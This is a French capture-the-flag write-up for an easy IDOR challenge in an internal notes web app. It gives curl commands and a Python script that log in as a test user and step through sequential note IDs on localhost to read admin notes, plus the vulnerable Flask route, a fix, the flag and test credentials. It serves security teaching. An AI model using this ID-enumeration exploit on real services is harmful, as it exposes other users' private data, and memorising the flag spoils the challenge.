# 📝 Write-up — Notes Internes (IDOR)

**Catégorie :** Web Security  
**Difficulté :** 🟢 Facile  
**Flag :** `GENTLE{ID0R_1n_Th3_AP1_P4r4m3t3r}`  
**Auteur :** CTF Designer  

---

# 📄 Énoncé

Vous avez accès à la plateforme interne de gestion des notes d’une entreprise.  
En tant qu’utilisateur standard, vous ne devriez voir **que vos propres notes**, mais une faille semble permettre l’accès aux notes **confidentielles des administrateurs**…

🎯 Objectif : Trouver le flag caché dans les notes admin.  
🔐 Format du flag : `GENTLE{...}`

---

# 📁 Fichiers fournis

- Code source complet de l’application web  
- Dockerfile pour un déploiement local  
- Script Python d'exploitation  
- Accès local : `http://localhost:8080`  

**Comptes de test :**  
- `john:password123`  
- `alice:alice2023`

---

# ✅ Étapes de résolution

## 🔍 Étape 1 — Reconnaissance & Analyse de l'application

### 1. Connexion  
Se connecter avec le compte utilisateur classique :

```
john / password123
```

### 2. Exploration
Naviguer vers `/notes`, puis cliquer sur une note :

```
/note/4
```

### 3. Indice dans le code source

```html
<!-- L'API utilise des IDs numériques séquentiels.
Les admins ont souvent des IDs très bas. -->
```

---

## 🔍 Étape 2 — Analyse de l'API & Tests Manuels

### Observation dans DevTools
Requête observée :

```
/api/note/4
```

### Test via curl

```bash
curl -c cookies.txt -X POST http://localhost:8080/login   -d "username=john&password=password123"

curl -b cookies.txt http://localhost:8080/api/note/1
curl -b cookies.txt http://localhost:8080/api/note/2
curl -b cookies.txt http://localhost:8080/api/note/3
```

➡️ Résultat : accès à TOUTES les notes, sans contrôle.

---

## 🛠️ Étape 3 — Exploitation IDOR

### Script Python

```python
import requests
import re

def exploit():
    base_url = "http://localhost:8080"

    session = requests.Session()
    session.post(f"{base_url}/login", data={'username': 'john', 'password': 'password123'})

    for note_id in range(1, 10):
        response = session.get(f"{base_url}/api/note/{note_id}")
        if response.status_code == 200:
            note = response.json()
            print(f"[+] Note {note_id}: {note['author']} - {note['title']}")

            flag = re.search(r'GENTLE\{[^}]+\}', note['content'])
            if flag:
                print(f"FLAG : {flag.group(0)}")
                return flag.group(0)
```

---

## 🔎 Étape 4 — Analyse du Code Source

```python
@app.route('/api/note/<int:note_id>')
def api_get_note(note_id):
    note = Note.query.get(note_id)
    # ❌ Pas de vérification du propriétaire !
```

---

## 🧰 Étape 5 — Exploitation BurpSuite

1. Intercepter `GET /api/note/4`  
2. Modifier en :

```
GET /api/note/1
```

3. Envoyer → note admin trouvée + flag.

---

# 🎉 Flag

```
GENTLE{ID0R_1n_Th3_AP1_P4r4m3t3r}
```

---

# 🛠️ Outils utilisés

- Navigateur + DevTools  
- curl  
- Python (requests, regex)  
- BurpSuite  
- Éditeur de code  

---

# 📚 Points clés

| Concept | Importance |
|--------|------------|
| IDOR | accès non autorisé via IDs prévisibles |
| API Security | endpoints exposés |
| Contrôles d’autorisation | indispensables |
| Information Disclosure | indices via commentaires |

---

# 🛡️ Correction recommandée

```python
if note.user_id != session['user_id'] and not session.get('is_admin'):
    return jsonify({'error': 'Accès non autorisé'}), 403
```

---

# 🚀 Pour aller plus loin

- Remplacer les IDs par des UUID  
- Ajouter un middleware d’autorisation  
- Auditer les endpoints API  
- Implémenter un RBAC strict  

---

**Document à but éducatif uniquement.**
